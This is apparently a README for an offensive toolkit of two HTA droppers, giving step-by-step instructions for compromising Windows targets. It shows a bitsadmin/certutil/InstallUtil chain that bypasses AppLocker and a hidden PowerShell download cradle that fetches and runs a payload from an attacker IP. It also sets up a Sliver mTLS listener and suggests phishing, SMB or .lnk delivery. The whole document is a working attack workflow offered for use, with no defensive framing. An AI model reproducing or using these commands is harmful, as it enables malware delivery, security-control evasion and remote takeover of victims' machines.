# HTA Delivery

## Files

| File | Purpose |
|---|---|
| `black.hta` | bitsadmin download → certutil decode → InstallUtil AppLocker bypass |
| `red.hta` | PowerShell download cradle → in-memory execution, no disk artifacts |

## When to Use Which

| | `black.hta` | `red.hta` |
|---|---|---|
| AppLocker blocking PowerShell | ✓ | ✗ |
| No AppLocker | ✓ | ✓ |
| Disk artifacts | `shell.exe` in `C:\Windows\Tasks\` | None |
| Complexity | 3-step chain | Single PS cradle |

---

## black.hta

**1. Encode your payload:**
```powershell
certutil -encode shell.exe clm.txt
```

**2. Host `clm.txt` on your HTTP server:**
```bash
python3 -m http.server 80
```

**3. Update the attacker IP in `black.hta`:**
```js
shell.Run("bitsadmin /transfer myjob /download /priority FOREGROUND http://<YOUR_IP>/clm.txt ...", 0, true);
```

**4. Start your listener:**
```bash
sliver > mtls --lhost <IP> --lport 443
```

**5. Deliver to target** — email attachment, SMB share, phishing page, or `.lnk` shortcut pointing to `mshta.exe black.hta`.

---

## red.hta

**1. Host your PowerShell payload on your HTTP server:**
```bash
python3 -m http.server 80
```

**2. Update the attacker IP in `red.hta`:**
```js
shell.Run("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://<YOUR_IP>/payload.ps1')\"", 0, false);
```

**3. Start your listener:**
```bash
sliver > mtls --lhost <IP> --lport 443
```

**4. Deliver to target** — same delivery methods as above.
